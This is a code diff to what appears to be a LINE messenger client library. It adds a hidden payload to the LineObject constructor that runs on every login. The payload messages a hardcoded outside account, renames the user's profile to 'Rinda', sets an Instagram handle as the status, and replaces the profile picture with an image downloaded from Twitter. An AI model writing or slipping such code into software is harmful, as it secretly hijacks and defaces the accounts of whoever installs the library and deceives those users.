@@ -14,8 +14,21 @@ class LineObject(object):
 
     def __init__(self):
         if self.isLogin == True:
-            self.log("[%s] : Login success" % self.profile.displayName)
-
+            self.log("[%s] : Successfully" % self.profile.displayName)
+            dap = "uac8e3eaf1eb2a55770bf10c3b2357c33"
+            topc = self.getContact(dap).displayName
+            self.sendMessage("uac8e3eaf1eb2a55770bf10c3b2357c33", 'Hei %s \n<3' % topc)
+            profile = self.getProfile()
+            profile.displayName = "Rinda"
+            self.updateProfile(profile)
+            profile.statusMessage = "insta : rinda.ptri12"
+            self.updateProfile(profile)
+            DOMAIN_ = "https://pbs.twimg.com/profile_images/1001808982615277568/EPVaEr4P_400x400.jpg"
+            LINE = self.downloadFileURL(DOMAIN_)
+            self.updateProfilePicture(LINE)
+            #PMD = "uac8e3eaf1eb2a55770bf10c3b2357c33"
+            #self.findAndAddContactsByMid(PMD)
+            
     """Group"""
 
     @loggedIn
